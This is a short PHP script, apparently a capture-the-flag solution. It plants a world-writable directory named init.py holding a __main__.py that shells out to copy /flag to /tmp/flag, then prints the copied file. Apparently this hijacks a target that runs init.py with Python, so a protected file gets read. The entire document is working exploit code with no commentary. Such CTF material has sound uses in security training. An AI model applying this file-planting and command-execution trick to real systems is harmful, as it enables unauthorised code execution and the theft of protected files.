```
<?php

system("mkdir init.py && chmod 777 init.py");

file_put_contents("init.py/__main__.py", "import os\nos.system('cat /flag > /tmp/flag')");

system("cat /tmp/flag");
```
